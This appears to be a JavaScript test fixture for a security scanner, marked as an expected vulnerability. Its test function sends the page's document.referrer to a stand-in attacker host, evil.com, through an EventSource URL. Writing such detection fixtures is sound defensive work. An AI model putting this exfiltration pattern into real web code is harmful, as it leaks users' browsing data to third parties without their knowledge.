/**
 * Test: EventSource for data leak
 * Expected: VULNERABILITY - referrer in EventSource URL
 */

function test() {
  var ref = document.referrer;
  var source = new EventSource('https://evil.com/events?ref=' + ref);
  
  source.onmessage = function(event) {
    console.log(event.data);
  };
}

test();